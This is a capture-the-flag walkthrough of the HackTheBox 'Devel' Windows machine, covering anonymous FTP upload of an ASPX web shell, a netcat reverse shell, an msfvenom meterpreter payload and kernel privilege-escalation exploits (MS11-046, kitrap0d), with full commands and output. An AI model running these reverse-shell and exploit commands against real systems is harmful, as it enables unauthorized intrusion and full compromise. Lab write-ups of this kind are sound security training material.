---
title: HackTheBox Devel Writeup
authors: Samarth
date: 2022-12-23 15:15:00 +0530
categories: [HackTheBox Machines]
tags: [Kernal Exploit, FTPd, Windows]
math: true
mermaid: true
---

![Devel - HTB](/assets/images/writeups/Devel-HTB/banner.png)

## TL;DR

This writeup is based on [__Devel__](https://app.hackthebox.com/machines/Devel){:target="_blank"} which is an easy-rated machine on HackTheBox. It starts with FTP and HTTP. I will use FTP anonymous login to upload a webshell to get shell on the machine. Later on, I’ll use one of many Windows kernel exploit to gain system shell. It requires some basic privilege escalation for the root flag.

## Scanning Network

I will start with Nmap scan to find the open ports and services active on machine. I found FTP and HTTP open on 21 and 80 respectively. By using Banner Grabbing, we will able to get the version of FTP and HTTP. Let’s see the nmap result.

```bash
 Command - nmap -sC -sV -oA intense 10.129.152.23


 Nmap scan report for 10.129.152.23
 Host is up (0.069s latency).
 Not shown: 998 filtered ports
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | 03-18-17  02:06AM                aspnet_client
 | 03-17-17  05:37PM                689 iisstart.htm
 |03-17-17  05:37PM                 184946 welcome.png | ftp-syst:  |  SYST: Windows_NT
 80/tcp open  http    Microsoft IIS httpd 7.5
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: IIS7
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
 ```

As we found the version of FTP and HTTP. First, we will enumerate HTTP. Let’s jump into it in enumeration phase.

## Enumeration

Let’s see the IP on the browser.

![Browser View](/assets/images/writeups/Devel-HTB/1.png)

The above image reveals that the website is running on IIS 7 Server. We have an option to do directory brute-force but I want to skip this process because we didn’t have anything interesting on the website. But we can see the source of the website.

![Welcome Page](/assets/images/writeups/Devel-HTB/2.png)

We can see that the image on the website is having the source “welcome.png”. Now, we have only this much information for HTTP. Let’s move to enumeration of FTP.

We will login to FTP via anonymous user.

```bash
ftp 10.129.152.23

Connected to 10.129.152.23.
220 Microsoft FTP Service
Name (10.129.118.104:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM                     aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
 226 Transfer complete
```

In the FTP login, we are able to see some uploaded file and it includes the `welcome.png` which correlates us to the source which we saw on the source of the website. So now, let’s check <b>welcome.png</b> on the website.

![View Source](/assets/images/writeups/Devel-HTB/3.png)

We can see the `welcome.png` on the website which is uploaded on the machine via ftp. It indicates that we can able to upload files to trigger RCE (Remote Code Execution) on the machine. Remote Code Execution is a vulnerability when an attacker puts some input to a file and executes it. It leads to full compromise of target machine.

We can upload a test file to the machine to check whether we can able to upload any file or not.

```bash
ftp 10.129.152.23
 Connected to 10.129.152.23.
 220 Microsoft FTP Service
 Name (10.129.152.23:root): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp> put testh4x.txt 
 local: testh4x.txt remote: testh4x.txt
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 32 bytes sent in 0.00 secs (1.0523 MB/s)
 ```

## Exploitation (Without Metasploit)

### FTP Exploitation (File Upload)

We successfully uploaded our test file to the machine. Now, we can upload a simple web shell to the machine. If you search for web shells on Google, you will get tons of shells. I like to use web shell from [__SecLists__](https://github.com/danielmiessler/SecLists){:target="_blank"}. Later on we will visit to <ip address>/cmd.aspx.

```bash
ftp 10.129.152.23
 Connected to 10.129.152.23.
 220 Microsoft FTP Service
 Name (10.129.152.23:root): anonymous
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp> put cmd.aspx 
 local: cmd.aspx remote: cmd.aspx
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 1442 bytes sent in 0.00 secs (31.2545 MB/s)
```

Now I will visit http://10.129.152.23/cmd.aspx. and I get a form.

![Web Shell](/assets/images/writeups/Devel-HTB/4.png)

Now we can run `whoami` to print the current user of machine.

![Web Shell](/assets/images/writeups/Devel-HTB/5.png)

As also we can run `dir` to see the files, we get to know the directory path of the target machine.

![Directory path of the machine](/assets/images/writeups/Devel-HTB/6.png)

As we can see that the user is `iis appool\web`, we have some ways to get shell by using nc.exe, [__Nishang__](https://github.com/samratashok/nishang){:target="_blank"} and Meterpreter. I will use nc.exe to get the shell.

I’ll make a directory name `h4xploit` and copy nc.exe in the directory. I will run now smb server.

```bash
sudo python smbserver.py share h4xploit/
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [] Config file parsed 
 [] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 [] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
 [] Config file parsed
 [] Config file parsed 
 [] Config file parsed
```

Now, I will launch `nc` listener on my local box to get the shell.

```bash
nc -lnvp 443
Listening on 0.0.0.0 443
```

Now, I will give command to the webshell.

```bash
\\10.10.14.61\share\nc.exe -e cmd.exe 10.10.14.61 443 
```

By this above command, we get the shell.

```bash
Connection received on 10.129.152.23 49159
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 c:\windows\system32\inetsrv>whoami
 iis apppool\web
 c:\windows\system32\inetsrv> cd ../../..
 c:\ cd Users
 c:\Users>cd babis 
 cd babis
 Access is denied.
 c:\Users>
 ```

As you can see we have access denied to the users. So we have to get the system shell.

Now, we have to use exploit suggestor as WinPEAS, Watson or msfconsole’s local-exploit-suggestor. I will be using watson to see the suggested exploits.

### Privilege Escalation (Using Watson)

I already transferred the Watson.exe to the target system using smbserver. If you want to download Watson.exe, then visit [__Watson__](https://github.com/rasta-mouse/Watson){:target="_blank"}.

Now, let’s run the watson.exe and see the suggested exploits for privilege escalation.

```bash
c:\Windows\Microsoft.NET\Framework>\10.10.14.61\share\Watson.exe
\\10.10.14.61\share\Watson.exe
  
[] OS Build number: 7600 
[] CPU Address Width: 32 
[] Process IntPtr Size: 4 
[] Using Windows path: C:\WINDOWS\System32

[] Appears vulnerable to MS10-073
 [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel. 
[>] Exploit: https://www.exploit-db.com/exploits/36327/ 
[>] Notes: None. 

[] Appears vulnerable to MS10-092 
[>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
[>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
[>] Notes: None. 

[] Appears vulnerable to MS11-046
 [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges. 
[>] Exploit: https://www.exploit-db.com/exploits/40564/ 
[>] Notes: None.

[] Appears vulnerable to MS12-042 
[>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode. 
[>] Exploit: https://www.exploit-db.com/exploits/20861/ 
[>] Notes: None. 

[] Appears vulnerable to MS13-005 
[>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. 
[>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb 
[>] Notes: None. 

[] Finished. Found 5 vulns :)
```
As you can see the suggested exploits above using Watson.exe. Now, I’ll choose [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046){:target="_blank"} because I found it compatible with our requirements and easily available on [__WindowsExploits__](https://github.com/abatchy17/WindowsExploits){:target="_blank"}. If you see the source of the exploit it shows:

```bash
Privileged shell execution:  
     - the SYSTEM shell will spawn within the invoking shell/process
```

For getting system shell, we have [__MS11-046__](https://github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046){:target="_blank"}, this is a precompiled exe that spawn system shell within current shell. I will save this exe in my smb share and run it on the current shell. If you want to know more about MS11-046, then you can visit [__here__](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046){:target="_blank"}.

```bash
c:\Users>\\10.10.14.61\share\MS11-046.exe
 
 c:\Windows\System32>whoami
 whoami
 nt authority\system
 c:\Windows\System32>
```

## Exploitation (With Metasploit)

We have to create a payload using msfvenom to upload in the machine using <b>ftp</b>.

```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.61 LPORT=4444 -f aspx > h4xplo1t.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of aspx file: 2884 bytes
```

As I created the payload. Now, I will upload this file to the machine.

```bash
ftp 10.129.152.23
 Connected to 10.129.152.23.
 220 Microsoft FTP Service
 Name (10.129.152.23:root): anonymous
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp> put h4xplo1t.aspx 
 local: h4xplo1t.aspx remote: h4xplo1t.aspx
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 2921 bytes sent in 0.00 secs (30.9520 MB/s)
```

Now, I will visit http://10.129.152.23/h4xplo1t.aspx. Until we can setup the meterpreter for getting shell.

```bash
msf6 > use exploit/multi/handler 
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > show options
 Module options (exploit/multi/handler):
 Name  Current Setting  Required  Description
 ----  ---------------  --------  -----------
 Payload options (windows/meterpreter/reverse_tcp):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST                      yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port
 Exploit target:
 Id  Name
 --  ----
 0   Wildcard Target
 msf6 exploit(multi/handler) > set LHOST 10.10.14.61
 LHOST => 10.10.14.61
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.61:4444
```

After visiting to http://10.129.152.23/h4xplo1t.aspx. I get the shell in metasploit.

```bash
[*] Meterpreter session 1 opened (10.10.14.61:4444 -> 10.129.152.23:49164) at 2021-05-28 12:41:14 +0000
 meterpreter > sysinfo
 Computer        : DEVEL
 OS              : Windows 7 (6.1 Build 7600).
 Architecture    : x86
 System Language : el_GR
 Domain          : HTB
 Logged On Users : 0
 Meterpreter     : x86/windows
```

Now, I’ll use local_exploit_suggestor for identifying exploits to get system shell. I will select the backgrounded session to identify the exploit.

```bash
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
 SESSION => 1
 msf6 post(multi/recon/local_exploit_suggester) > run
 [] 10.129.152.23 - Collecting local exploits for x86/windows… [] 10.129.152.23 - 37 exploit checks are being tried…
 [+] 10.129.152.23 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
 [+] 10.129.152.23 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
 [+] 10.129.152.23 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
 [+] 10.129.152.23 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
 [+] 10.129.152.23 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.129.152.23 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 [*] Post module execution completed
```

I will use exploit/windows/local/ms10_015_kitrap0d, this exploit gives new session with system shell.

```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
 SESSION => 2
 msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.61
 LHOST => 10.10.14.61
 msf6 exploit(windows/local/ms10_015_kitrap0d) > run
 [] Started reverse TCP handler on 10.10.14.61:4444  [] Launching notepad to host the exploit…
 [+] Process 3204 launched.
 [] Reflectively injecting the exploit DLL into 3204… [] Injecting exploit into 3204 …
 [] Exploit injected. Injecting payload into 3204… [] Payload injected. Executing exploit…
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
 [] Sending stage (175174 bytes) to 10.129.152.23 [] Meterpreter session 3 opened (10.10.14.61:4444 ->    
 10.129.152.23:49165) at 2021-05-28 12:51:59 +0000
 meterpreter > shell
 Process 3484 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 c:\windows\system32\inetsrv>whoami
 whoami
 nt authority\system
 c:\windows\system32\inetsrv>
```

As we saw in the manual exploitation part, before privilege escalation, we don’t have access to the user as well as to root flag. Once we escalated the privileges, we have access to user.txt and root.txt

### Devel Writeup: User

We get the user babis. We get the user flag.

```bash
c:>cd Users/babis/Desktop
 c:\Users\babis\Desktop>type user.txt.txt
 9ecdd6a3axxxxxxxxxxxxxxxxxxxxxxx
 c:\Users\babis\Desktop>
```

### Devel Writeup: Root

We can now read the root flag.

```bash
c:\Users>cd Administrator/Desktop 
 c:\Users\Administrator\Desktop>type root.txt 
 e621a0b504xxxxxxxxxxxxxxxxxxxxxx 
 c:\Users\Administrator\Desktop>
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.